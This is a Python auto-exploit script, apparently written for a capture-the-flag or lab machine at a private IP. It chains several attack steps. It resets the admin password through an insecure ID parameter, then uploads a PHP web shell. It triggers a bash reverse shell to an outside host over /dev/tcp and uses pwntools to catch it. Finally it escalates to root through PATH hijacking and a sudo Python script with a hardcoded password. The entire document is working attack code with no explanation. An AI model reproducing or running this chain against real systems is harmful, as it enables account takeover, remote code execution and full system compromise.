#!/usr/bin/python3
import requests
import os
import paramiko
import multiprocessing
import subprocess
from pwn import log, listen




# Variables globales
IP = "192.168.6.126"
register_url = "http://%s/register.php" % IP
login_url = "http://%s/login.php" % IP
main_url = "http://%s/dashboard.php?id=2" % IP
upload_url = "http://%s/dashboard.php?id=1" % IP
file = "test.phtml"
lport = "443"
s = requests.session()


def Register():

	data_post = {
		"username": "pr1ngl3s",
		"email": "pr1ngl3s@pr1ngl3s.com",
		"password": "pr1ngl3s"
	}

	r = requests.post(register_url, data=data_post)


def Login(username="admin",password="admin"):
	data_post = {
		"username": username,
		"password": password
	}

	r = s.post(login_url, data=data_post)

def ChangePass():
	data_post = {
		"password": "admin",
		"id": "1"
	}

	r = s.post(main_url, data=data_post)

def MakeFile():
	content = "<?php\n\tsystem($_GET['cmd']);\n?>"

	with open(file, "w") as archivo:
		archivo.write(content)

def UploadFile():
	with open(file, "rb") as fupload:
		files = {"fileToUpload": fupload}

		r = s.post(upload_url,files=files)

def GetShell():
	url = "http://%s/upload/%s" % (IP,file)

	payload = {
		"cmd": "bash -c 'bash -i >& /dev/tcp/192.168.6.5/443 0>&1'"
	}

	r = requests.get(url,params=payload)



if __name__ == "__main__":
	Register()
	MakeFile()
	Login("pr1ngl3s","pr1ngl3s")
	ChangePass()
	Login()
	UploadFile()
	os.remove(file)

	multiprocessing.Process(target=GetShell).start()

	with listen(lport,timeout=20) as shell:
		if shell.wait_for_connection():
			shell.sendline("cd /home/john".encode('utf-8'))
			shell.sendline("echo 'bash' > /tmp/id".encode('utf-8'))
			shell.sendline("chmod +x /tmp/id".encode('utf-8'))
			shell.sendline("export PATH=/tmp:$PATH".encode('utf-8'))
			shell.sendline("./toto".encode('utf-8'))
			shell.sendline("echo '#!/usr/bin/python3\nimport os\nos.system(\"bash\")' > file.py".encode('utf-8'))
			shell.sendline("sudo -S /usr/bin/python3 /home/john/file.py".encode('utf-8'))
			shell.sendline("root123".encode('utf-8'))
			shell.interactive()

